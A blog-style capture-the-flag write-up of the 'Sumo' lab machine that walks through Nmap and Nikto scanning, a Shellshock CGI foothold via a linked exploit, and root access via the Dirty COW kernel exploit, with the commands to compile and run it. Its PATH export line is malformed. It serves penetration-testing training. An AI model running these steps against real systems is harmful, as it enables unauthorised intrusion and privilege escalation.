---
title: "Proving grounds Play: Sumo"
layout: post
date: 2023-08-29 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
- Dirtyc0w
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 06cb9ea3aff01048c417934a2c45d948 (DSA)
|   2048 b7c5427bbaae9b9b7190e747b4a4de5a (RSA)
|_  256 fa81cd002d52660b70fcb840fadb1830 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Vulnerable to Shellshock

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.180.87
+ Target Hostname:    192.168.180.87
+ Target Port:        80
+ Start Time:         2023-08-28 23:26:01 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ /: Server may leak inodes via ETags, header found with file /, inode: 1706318, size: 177, mtime: Mon May 11 13:55:10 2020. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ /cgi-bin/test: Uncommon header '93e4r0-cve-2014-6271' found, with contents: true.
+ /cgi-bin/test: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
+ /cgi-bin/test.sh: Uncommon header '93e4r0-cve-2014-6278' found, with contents: true.
+ /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
```

## Initial Foothold

Run netcat listener and the [Shellshock Exploit](https://github.com/b4keSn4ke/CVE-2014-6271) to obtain initial foothold.

![img](/assets/images/CTF/Proving_Grounds/Sumo/shell.png)

## Privilege Escaltion

**Get kernel information**

```sh
cat /etc/*release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
```

Ubuntu 12.04 is vulnerable to [Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)](https://www.exploit-db.com/exploits/40839).

Download the exploit to the attaking machine and make sure the `gcc` path is exported, if not use the below to export.

```sh
PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH
```

**Follow below steps to obtain root**

```sh
# compile the code
gcc -pthread dirty.c -o dirty -lcrypt

# Then run the newly create binary
./dirty my-new-password

# now use su or ssh to firefart with new password
```

![img](/assets/images/CTF/Proving_Grounds/Sumo/root.png)

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).